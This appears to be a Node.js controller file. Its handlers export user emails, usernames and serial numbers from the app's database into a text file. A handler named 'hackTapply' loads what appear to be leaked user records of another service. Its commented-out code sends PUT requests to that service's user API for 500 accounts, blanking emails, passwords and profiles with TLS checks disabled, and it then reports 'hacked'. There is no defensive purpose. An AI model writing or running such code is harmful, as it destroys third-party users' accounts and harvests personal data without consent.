import SerialNumber from "../models/serialNoModel.js";
import fs from "fs";
import User from "../models/usersModel.js";
// import axios from "axios";
// import https from "https";

const getInactiveSerials = async (req, res, next) => {
  const result = await SerialNumber.find({
    cardRegistered: true,
    userRegistered: false,
  });
  const serialNoArray = [];
  result.map((value) => serialNoArray.push(value.serialNo));

  for (let i = 0; i < serialNoArray.length; i++) {
    const newLine = `${serialNoArray[i]}\n`;
    fs.appendFileSync("2pac.txt", newLine, (err) => {
      if (err) throw err;
    });
  }

  res.json({ result: serialNoArray });
};

const getEmailList = async (req, res, next) => {
  const result = await User.find();
  const emailList = [];
  result.map((value) => emailList.push(value.email));

  for (let i = 0; i < emailList.length; i++) {
    const newLine = `${emailList[i]}\n`;
    fs.appendFileSync("2pac.txt", newLine, (err) => {
      if (err) throw err;
    });
  }

  res.json({ result: emailList });
};

const getOther = async (req, res, next) => {
  const result = await User.find();
  let counter = 0;
  const userName = [];

  result.forEach((value) => {
    if (value.email.includes("_")) {
      userName.push({ userName: value.userName, email: value.email });
      counter++;
    }
  });

  for (let i = 0; i < userName.length; i++) {
    const newLine = `{userName: ${userName[i].userName}, email: ${userName[i].email}}\n`;
    fs.appendFileSync("2pac.txt", newLine, (err) => {
      if (err) throw err;
    });
  }

  res.json({ result: counter });
};

const hackTapply = async (req, res, next) => {
  const updateObject = {
    email: "",
    username: "",
    links: [],
    role: "",
    isBlock: false,
    activatedAt: "2021-01-01T00:00:00.00Z",
    firstName: "",
    lastName: "",
    avatar: "",
    description: "",
    fullName: "",
    phone: "",
    expiredResetPassword: "2021-01-01T00:00:00.00Z",
    resetToken: "",
    password: "",
  };

  const rawData = fs.readFileSync("data/tapply/halfdata.json");
  const data = JSON.parse(rawData);

  const activeUsers = [];

  data.forEach((value) => {
    if (value.username) {
      activeUsers.push(value);
    }
  });

  console.log(activeUsers.length);

  // try {
  //   const agent = new https.Agent({
  //     rejectUnauthorized: false,
  //   });

  //   for (let i = 0; i < 500; i++) {
  //     await axios.put(
  //       `https://api.tapply.vn/v1/users/${activeUsers[i]._id}`,
  //       updateObject,
  //       {
  //         httpsAgent: agent,
  //       }
  //     );
  //   }
  // } catch (error) {
  //   console.log(error.message);
  // }

  res.json({ result: "hacked" });
};

const operations = async (req, res, next) => {
  res.json({ counter: "running some random operations" });
};

export { getInactiveSerials, getEmailList, getOther };
export { hackTapply, operations };
